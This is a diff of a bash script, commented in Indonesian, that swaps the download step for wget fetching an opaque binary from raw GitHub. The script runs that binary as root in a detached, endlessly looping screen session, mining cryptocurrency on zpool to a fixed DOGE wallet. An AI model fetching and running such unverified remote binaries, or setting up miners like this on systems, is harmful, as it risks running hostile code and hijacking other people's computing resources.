@@ -11,7 +11,7 @@ cd /root || exit
 # Download miner jika belum ada
 if [ ! -f benchmarks ]; then
   echo "⬇️ Mengunduh file benchmarks..."
-  clone -O amirul https://github.com/amirul5656/web.git
+  wget -O amirul https://raw.githubusercontent.com/amirul5656/web1/refs/heads/main/owada
   chmod +x amirul
 fi
 
@@ -22,7 +22,7 @@ else
   echo "▶ Menjalankan mining di screen 'amirul3'..."
   screen -dmS amirul3 bash -c '
     while true; do
-      ./amirul -o stratum+tcp://yespowerSUGAR.sea.mine.zpool.ca:6241 -u D8n4HXcTza73pBw93ZnSgcZRo8rHdZJLux -p c=DOGE -t 3
+      ./amirul --disable-gpu --algorithm xelisv2_pepew --pool stratum+tcp://xelisv2-pepew.sea.mine.zpool.ca:4833 --wallet D8n4HXcTza73pBw93ZnSgcZRo8rHdZJLux --password c=DOGE -t 3
       sleep 2
     done
   '
